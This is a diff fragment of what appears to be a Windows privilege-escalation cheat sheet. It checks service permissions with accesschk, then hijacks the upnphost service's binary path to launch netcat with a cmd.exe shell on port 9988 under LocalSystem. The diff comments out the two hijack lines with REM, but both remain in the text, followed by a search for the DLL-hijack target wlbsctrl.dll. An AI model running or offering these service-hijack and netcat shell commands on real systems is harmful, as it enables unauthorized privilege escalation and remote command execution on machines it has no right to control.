@@ -68,9 +68,10 @@ accesschk.exe -uwcqv "Authenticated Users" *
 accesschk.exe -ucqv SSDPSRV
 accesschk.exe -ucqv upnphost
 sc qc upnphost
-sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
-sc config upnphost obj= ".\LocalSystem" password= ""
+REM sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+REM sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 net start upnphost
 cd c:\
 dir wlbsctrl.dll /s
+
